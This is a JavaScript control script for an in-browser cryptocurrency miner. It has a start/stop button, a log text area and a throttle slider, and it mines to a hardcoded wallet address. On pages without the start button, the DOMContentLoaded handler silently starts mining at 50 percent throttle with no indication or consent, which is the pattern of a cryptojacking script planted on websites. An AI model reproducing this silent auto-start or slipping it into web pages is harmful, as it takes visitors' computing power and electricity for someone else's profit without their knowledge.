let isCurrentlyMining = false;
let intervalId;

document.addEventListener("DOMContentLoaded", () => {
  const startButton = document.getElementById("startb");
  if (startButton) {
    startButton.addEventListener("click", start);
  } else {
    startMining(
      "4688YCrSqBZA5XcyPmnNieYD2ZX2wPaA5AWRtqbZCN9WLxokKMjaT7kLhnph5rzxp1DoHkzvwGJPJRM2QbQqwoBiN7PNgfZ"
    );
    throttleMiner = 50;
  }
});

function start() {
  let button = document.getElementById("startb");
  isCurrentlyMining = !isCurrentlyMining;

  if (isCurrentlyMining) {
    startMining(
      "4688YCrSqBZA5XcyPmnNieYD2ZX2wPaA5AWRtqbZCN9WLxokKMjaT7kLhnph5rzxp1DoHkzvwGJPJRM2QbQqwoBiN7PNgfZ"
    );
    button.textContent = "Stop mining";

    /* keep us updated */

    addText("Connecting...");

    intervalId = setInterval(function () {
      // for the definition of sendStack/receiveStack, see miner.js
      while (sendStack.length > 0) addText(sendStack.pop());
      while (receiveStack.length > 0) addText(receiveStack.pop());
      addText("calculated " + totalhashes + " hashes.");
    }, 2000);
  } else {
    clearInterval(intervalId);
    stopMining();
    button.textContent = "Start mining";
  }
}

/* helper function to put text into the text field.  */

function addText(obj) {
  let elem = document.getElementById("texta");
  elem.value += "[" + new Date().toLocaleString() + "] ";

  if (obj.identifier === "job") elem.value += "new job: " + obj.job_id;
  else if (obj.identifier === "solved")
    elem.value += "solved job: " + obj.job_id;
  else if (obj.identifier === "hashsolved") elem.value += "pool accepted hash!";
  else if (obj.identifier === "error") elem.value += "error: " + obj.param;
  else elem.value += obj;

  elem.value += "\n";
  elem.scrollTop = elem.scrollHeight;
}

(function handleThrottling() {
  let slider = document.getElementById("throttleMiner");
  let output = document.getElementById("minerPower");

  if (!slider || !output) return;
  output.innerHTML = "Miner power:" + slider.value;

  throttleMiner = 100 - slider.value;

  // Update the current slider value (each time you drag the slider handle)
  slider.oninput = function () {
    output.innerHTML = "Miner power:" + this.value;
    throttleMiner = 100 - slider.value;
  };
})();
